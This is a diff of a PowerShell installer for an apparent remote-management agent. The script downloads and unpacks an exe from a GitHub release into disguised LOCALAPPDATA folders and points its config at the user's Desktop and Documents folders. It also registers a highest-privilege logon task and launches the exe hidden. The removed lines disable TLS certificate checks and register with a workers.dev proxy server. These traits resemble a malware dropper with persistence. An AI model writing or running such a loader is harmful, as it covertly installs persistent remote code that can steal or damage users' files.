@@ -1,20 +1,10 @@
 $ErrorActionPreference = 'Stop'
-$dir  = "$env:LOCALAPPDATA\itmgn"
-$exe  = "$dir\itagnt.exe"
-$zip  = "$dir\itagnt.zip"
-$cfg  = "$dir\agent.json"
-$base = "https://rmm-proxy.aliakduman.workers.dev"
+$dir = "$env:LOCALAPPDATA\itmgn"
+$exe = "$dir\itagnt.exe"
+$zip = "$dir\itagnt.zip"
+$cfg = "$dir\agent.json"
 
 [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12
-
-add-type @"
-    using System.Net;
-    using System.Security.Cryptography.X509Certificates;
-    public class TrustAll : ICertificatePolicy {
-        public bool CheckValidationResult(ServicePoint sp, X509Certificate cert, WebRequest req, int problem) { return true; }
-    }
-"@
-[System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAll
 
 New-Item -ItemType Directory -Force -Path $dir | Out-Null
 
@@ -22,11 +12,10 @@ Invoke-WebRequest -Uri "https://github.com/protonme1241/rmm/releases/download/v1
 Expand-Archive -Path $zip -DestinationPath $dir -Force
 Remove-Item $zip -Force
 
-$r = Invoke-RestMethod -Uri "$base/api/register" -Method POST -ContentType "application/json" -UseBasicParsing
+$agentId = [guid]::NewGuid().ToString()
 
 @{
-    ServerUrl        = $base
-    AgentId          = $r.agent_id
+    AgentId          = $agentId
     TargetFolders    = @(
         [Environment]::GetFolderPath("Desktop"),
         [Environment]::GetFolderPath("MyDocuments")
@@ -39,4 +28,4 @@ schtasks /delete /tn "itmgn" /f 2>$null | Out-Null
 schtasks /create /tn "itmgn" /tr "`"$exe`"" /sc ONLOGON /rl HIGHEST /f | Out-Null
 
 Start-Process -FilePath $exe -WindowStyle Hidden
-Write-Host "Done. Agent ID: $($r.agent_id)"
+Write-Host "Done. Agent ID: $agentId"
